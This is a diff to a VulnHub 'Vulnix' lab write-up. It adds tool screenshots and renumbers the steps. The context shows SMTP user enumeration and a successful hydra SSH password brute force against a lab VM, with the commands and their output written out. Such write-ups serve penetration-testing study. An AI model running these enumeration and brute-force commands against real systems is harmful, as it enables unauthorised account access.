@@ -5,9 +5,13 @@ summary: This is the summary for an awesome post.
 tags: vulnhub, writeup
 
 ## Overview
-This is a writeup for VulnHub VM [HackLAB: Vulnix](https://www.vulnhub.com/entry/hacklab-vulnix,48/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:  
+This is a writeup for VulnHub VM [HackLAB: Vulnix](https://www.vulnhub.com/entry/hacklab-vulnix,48/). Here are stats for this machine from [machinescli](https://github.com/7h3rAm/machinescli):
+
+![writeup.overview.machinescli](/static/files/posts_vulnhub_vulnix/machinescli.png.webp)
 
 ### Killchain
+Here's the killchain (`enumeration` → `exploitation` → `privilege escalation`) for this machine:
+
 ![writeup.overview.killchain](/static/files/posts_vulnhub_vulnix/killchain.png.webp)
 
 ### TTPs
@@ -225,7 +229,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Sep 19 17:29:44 2019 -- 1 IP address (1 host up) scanned in 17.41 seconds
 ```
 
-2\. We perform SMTP user enumeration and find 2 hits:  
+2\. Here a summary of open ports and associated [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan files:
+
+![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_vulnix/openports.png.webp)  
+
+3\. We perform SMTP user enumeration and find 2 hits:  
 ```
 smtp-user-enum -M VRFY -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -t 192.168.92.177 -p 25 2>&1
   Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
@@ -252,7 +260,7 @@ smtp-user-enum -M VRFY -U "/usr/share/seclists/Usernames/top-usernames-shortlist
   17 queries in 2 seconds (8.5 queries / sec)
 ```
 
-3\. We also manually verified presence of user `vulnix` and `user`:  
+4\. We also manually verified presence of user `vulnix` and `user`:  
 ```
 smtp-user-enum -M VRFY -u vulnix -t 192.168.92.177 -p 25 2>&1
   Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
@@ -299,7 +307,7 @@ smtp-user-enum -M VRFY -u user -t 192.168.92.177 -p 25 2>&1
   1 queries in 1 seconds (1.0 queries / sec)
 ```
 
-4\. Bruteforcing the SSH password for `user` with `rockyou.txt` was successful and we can now login to the target:  
+5\. Bruteforcing the SSH password for `user` with `rockyou.txt` was successful and we can now login to the target:  
 ```
 hydra -l user -P /usr/share/wordlists/rockyou.txt -e nsr ssh://192.168.92.177
   Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -316,7 +324,7 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt -e nsr ssh://192.168.92.177
   Hydra (http://www.thc.org/thc-hydra) finished at 2019-09-20 14:09:45
 ```
 
-![writeup.enumeration.steps.4.1](/static/files/posts_vulnhub_vulnix/screenshot01.png.webp)  
+![writeup.enumeration.steps.5.1](/static/files/posts_vulnhub_vulnix/screenshot01.png.webp)  
 
 ### Findings
 #### Open Ports
